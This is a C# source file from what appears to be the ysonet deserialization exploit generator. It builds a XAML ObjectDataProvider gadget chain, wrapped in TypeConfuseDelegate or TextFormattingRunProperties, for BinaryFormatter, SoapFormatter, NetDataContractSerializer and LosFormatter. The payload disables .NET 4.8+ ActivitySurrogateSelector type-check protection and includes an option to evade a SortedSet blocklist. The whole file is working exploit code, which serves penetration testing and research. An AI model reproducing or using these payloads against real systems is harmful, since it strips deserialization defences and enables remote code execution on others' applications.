using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Reflection;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class ActivitySurrogateDisableTypeCheckGenerator : GenericGenerator
    {
        private const string WorkflowSetting =
            "microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck";
        private const string WorkflowAppSettings =
            "System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, "
            + "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";

        // Discovery facets (category search only): does not run a user command; it
        // flips a config flag to disable ActivitySurrogateSelector's type check. That
        // known result fits no broad family, so kind is "other". Uses WPF and
        // framework types. Variant 2 (TextFormattingRunProperties) additionally needs
        // Microsoft.PowerShell.Editor (declared as a variant override below).
        //
        // The type check this turns off is the 4.8+ protection, so 4.8 and 4.8.1 are
        // the builds where the payload has a job to do. On an older build the
        // protection is not there to disable.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Other)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx48, RuntimeVersion.NetFx481));
        }

        public override string AdditionalInfo()
        {
            // Kept short on purpose: this text is the interactive info panel's first
            // block, and a long one pushes the formatter/input/category lines off the
            // panel. The full story lives in the rootcontainer option help.
            return "Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored. "
                + "Variant 1 also takes rootcontainer (1 SortedSet, 2 SortedDictionary, 3 TreeSet) "
                + "to dodge a SortedSet wire-name blocklist; SoapFormatter supports roots 1 and 3. "
                + "Variant 1 self-tests in a child, then keeps the setting enabled in this session.";
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Ignored;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                // Variant 1 uses TypeConfuseDelegate's direct SOAP document for the
                // one-generic-layer SortedSet and TreeSet roots. Rootcontainer 2 has the
                // deeper SortedDictionary<KeyValuePair<...>> graph and is refused in
                // Generate() for SOAP only.
                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)"),
                new GadgetVariant(2, "TextFormattingRunProperties wrapper")
                    // No sorted container in this wrapper, so the root-container option
                    // does not apply and the editor stops offering it.
                    .WithoutOptions(TypeConfuseDelegateGenerator.XamlRootContainerOptionName)
                    // A variant override REPLACES the gadget's whole facet set, so it
                    // repeats the 4.8+ version support as well as the requirements.
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Other)
                        .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf,
                            GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx48, RuntimeVersion.NetFx481)))
            };
        }

        public override string Finders()
        {
            return "Nick Landers";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Hosted };
        }

        public override List<string> SupportedFormatters()
        {
            // The "(N)" suffix is a display-only annotation meaning "this formatter
            // carries N variants". SOAP carries both wrappers; the TCD wrapper supports
            // rootcontainer 1 and 3 and explicitly refuses rootcontainer 2.
            return new List<string> { "BinaryFormatter (2)", "SoapFormatter (2)", "NetDataContractSerializer (2)", "LosFormatter (2)" };
        }

        int variant_number = 1;

        // Serialized root container of the TypeConfuseDelegate wrapper. Orthogonal to
        // variant_number, which picks the WRAPPER, so it gets its own option instead of
        // overloading --variant (the same split ObjectDataProvider uses for --variant and
        // --xamlurl). Variant 2 declares it unused in Variants().
        int root_container_number = 1;

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Choices: 1 -> use TypeConfuseDelegateGenerator [default], 2 -> use TextFormattingRunPropertiesMarshal", v => int.TryParse(v, out variant_number) },
                {TypeConfuseDelegateGenerator.XamlRootContainerOptionName + "=",
                    TypeConfuseDelegateGenerator.XamlRootContainerOptionHelp,
                    v => root_container_number = TypeConfuseDelegateGenerator.ParseXamlRootContainerOption(v) },
            };

            return options;
        }

        // Variant 1 hands its XAML to XamlReader.Parse from inside a deserialization
        // callback, which fail-fasts the CLR after the payload has fired (see
        // Helpers/Core/IsolatedSelfTest.cs). Its -t self-test therefore runs in a child
        // process. Variant 2 (TextFormattingRunProperties) is unaffected.
        public override bool SelfTestNeedsChildProcess(string formatter, InputArgs inputArgs)
        {
            return variant_number == 1;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Validate the declared variant and the one option-specific SOAP exclusion.
            GuardVariantFormatter(variant_number, formatter);
            if (variant_number == 1
                && formatter.Equals(Formatters.SoapFormatter,
                    System.StringComparison.OrdinalIgnoreCase)
                && root_container_number == 2)
                throw new System.ArgumentException("SoapFormatter supports the "
                    + "TypeConfuseDelegate wrapper with rootcontainer 1 (SortedSet) and 3 "
                    + "(TreeSet), not 2 (SortedDictionary).");

            string xaml_payload = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:s=""clr-namespace:System;assembly=mscorlib""
xmlns:c=""clr-namespace:System.Configuration;assembly=System.Configuration""
xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
    <ObjectDataProvider x:Key=""type"" ObjectType=""{x:Type s:Type}"" MethodName=""GetType"">
        <ObjectDataProvider.MethodParameters>
            <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""field"" ObjectInstance=""{StaticResource type}"" MethodName=""GetField"">
        <ObjectDataProvider.MethodParameters>
            <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
            <r:BindingFlags>40</r:BindingFlags>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""set"" ObjectInstance=""{StaticResource field}"" MethodName=""SetValue"">
        <ObjectDataProvider.MethodParameters>
            <s:Object/>
            <s:Boolean>true</s:Boolean>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""setMethod"" ObjectInstance=""{x:Static c:ConfigurationManager.AppSettings}"" MethodName =""Set"">
        <ObjectDataProvider.MethodParameters>
            <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
            <s:String>true</s:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            if (inputArgs.Minify)
            {
                xaml_payload = XmlMinifier.Minify(xaml_payload, null, null);
            }

            object payload;
            if (variant_number == 2)
            {
                payload = Serialize(new TextFormattingRunPropertiesMarshal(xaml_payload),
                    formatter, inputArgs);
            }
            else if (formatter.Equals(Formatters.SoapFormatter,
                System.StringComparison.OrdinalIgnoreCase))
            {
                payload = TypeConfuseDelegateGenerator.SerializeSoapXamlGadget(
                    xaml_payload, root_container_number, inputArgs);
            }
            else
            {
                payload = Serialize(TypeConfuseDelegateGenerator.GetXamlGadget(
                    xaml_payload, root_container_number), formatter, inputArgs);
            }

            // Variant 1 has to test its exact payload in a child because that graph
            // fail-fasts after the XAML has fired. The child cannot retain a static field
            // for the interactive parent, so mirror the payload's two assignments here
            // after the child test returns. This is deliberately test-only: ordinary
            // generation must not alter ysonet's own Workflow policy.
            if (inputArgs != null && inputArgs.Test && variant_number == 1)
            {
                EnableForFollowOnSelfTests();
                Console.Error.WriteLine("[self-test] Workflow's type-check setting is now "
                    + "enabled in this ysonet process for follow-on local tests.");
            }

            return payload;
        }

        private static void EnableForFollowOnSelfTests()
        {
            try
            {
                // Set the configuration value first. If Workflow has not loaded its
                // one-time settings cache yet, its effective property will read true.
                ConfigurationManager.AppSettings.Set(WorkflowSetting, "true");

                Type appSettings = Type.GetType(WorkflowAppSettings, true);
                FieldInfo field = appSettings.GetField(
                    "disableActivitySurrogateSelectorTypeCheck",
                    BindingFlags.Static | BindingFlags.NonPublic);
                if (field == null || field.FieldType != typeof(bool))
                    throw new MissingFieldException(appSettings.FullName,
                        "disableActivitySurrogateSelectorTypeCheck");
                field.SetValue(null, true);

                // Verify the value Workflow itself will consume. This also catches its
                // dynamic-code policy gate rather than claiming the process is armed when
                // only the raw backing field changed.
                PropertyInfo effective = appSettings.GetProperty(
                    "DisableActivitySurrogateSelectorTypeCheck",
                    BindingFlags.Static | BindingFlags.NonPublic);
                if (effective == null || effective.PropertyType != typeof(bool)
                    || !(bool)effective.GetValue(null, null))
                    throw new InvalidOperationException(
                        "Workflow still reports the effective setting as false.");
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException(
                    "The variant 1 payload was tested in its safety child, but ysonet "
                    + "could not retain the Workflow setting for follow-on local tests: "
                    + ex.Message, ex);
            }
        }

    }
}
